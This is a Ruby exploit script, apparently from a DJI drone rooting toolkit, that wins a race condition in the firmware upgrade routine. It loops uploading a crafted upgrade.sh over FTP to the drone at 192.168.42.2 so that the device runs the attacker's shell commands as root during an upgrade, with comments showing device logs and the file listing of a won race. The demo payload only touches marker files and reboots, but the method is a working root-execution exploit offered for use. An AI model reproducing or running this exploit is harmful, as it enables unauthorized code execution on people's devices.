# Classic race condition exploitation complements of DJI Devs, exploited and brought to you by hostile
# 
# 01-01 00:13:48.907   235 25696 I DUSS&63[sys_upgrade_up_from_scri:3200]:: busybox tar -xvf /data/upgrade/temp.zip -C /data/upgrade exit status 256, return 1
# 01-01 00:13:48.908   235 25696 I DUSS&63[sys_upgrade_up_from_scri:3202]:: busybox tar -xvf /data/upgrade/temp.zip -C /data/upgrade error, retry_count=0
# 01-01 00:13:48.908   235 25696 I DUSS&63[sys_up_cleanup_disk_spac: 118]:: cleanup disk space of data
# (long pause)
# 01-01 00:13:53.712   235 25696 I DUSS&63[sys_upgrade_up_from_scri:3238]:: cd /data/upgrade; chmod 777 upgrade.sh; ./upgrade.sh exit status 0, return 0
# 01-01 00:13:53.712   235 25696 I DUSS&63[sys_upgrade_up_from_scri:3246]:: cd /data/upgrade; chmod 777 upgrade.sh; ./upgrade.sh success.
# 01-01 00:13:53.833   235   385 E DUSS&63[sys_up_status_push_threa:1012]:: Sending upgrade status to app_host 0xa01 failed, result=-1002
# 01-01 00:13:53.834   235   385 I DUSS&63[sys_up_status_push_threa:1039]:: more data 17 bytes left
# 01-01 00:13:53.839   235   385 I DUSS&63[sys_up_status_push_threa: 993]:: +++++++ Sending upgrade status
#
# You WILL want to watch the log file either via root, or with LogJammer... this does NOT work every time. 
# If you don't win the race... try again! 
# 
# A won race looks like this (note the presence of the RaceCondition file)

# -rw-------    1 0        0               16 Jan  1 00:05 RaceCondition
# drwx------    2 0        0             4096 Jan  1 00:01 backup
# -rw-rw-r--    1 1000     10              16 Jun 14 09:40 cnn_model.tar
# drwx------    2 0        0             4096 Jan  1 00:00 incomptb
# -rwxrwxr-x    1 1000     10              16 Jun 14 09:40 libcnn.so
# -rw-rw-r--    1 1000     10              16 Jun 14 09:40 marker.tar
# drwxr-xr-x    2 0        0             4096 Jan  1 00:01 signimgs
# -rw-------    1 0        0             2064 Jan  1 00:01 temp.zip
# -rw-------    1 0        0              112 Jan  1 00:01 upgrade.sh
# -rw-rw-r--    1 1000     10              16 Jun 14 09:40 upgrade_flag
# -rw-------    1 0        0             6000 Jan  1 00:05 wm330_0000.cfg.sig
# total 1508


require 'net/ftp'
require 'zlib'

$:.unshift File.expand_path('..',__dir__)
require "RubaDubDUML.rb"
exploit = PwnSauce.new

race = "busybox touch /data/RaceCondition
busybox touch /ftp/upgrade/upgrade/RaceCondition
busybox reboot"

File.open("upgrade.sh" , 'w+') {|f| f.write(race) }
%x[zip temp.zip upgrade.sh]
#%x[tar cvf temp.zip upgrade.sh]

ftp = Net::FTP.new('192.168.42.2')
ftp.passive = true
ftp.login("Race","Condition" )
puts "Logged into the FTPD... pounding its bung hole..."

upgradeshell = File.new("upgrade.sh")
tempzip = File.new("temp.zip")
ftp.chdir("/upgrade/upgrade/")
#ftp.delete("RaceCondition")

# User CherryPicker.rb to generate a dji_system.bin file with ONLY an 0805 module in it
exploit.pwn(ARGV[0], "ConditionedRace805_Mavic.bin", "")

loop do
    begin
#        ftp.putbinaryfile(tempzip, "temp.zip")
        ftp.putbinaryfile(upgradeshell, "upgrade.sh")
        finish = ftp.ls("/upgrade/upgrade/")
        puts "--------"
        puts finish
    
        if finish.to_s.include?("RaceCondition")
            puts "You fucking won!"
            exit
        end

    rescue Exception => e
        puts "The Race is over... if you can see /ftp/upgrade/upgrade/RaceCondition then you won!"
        File.unlink("upgrade.sh")
        File.unlink("temp.zip")
        exit 
    end
end
ftp.close


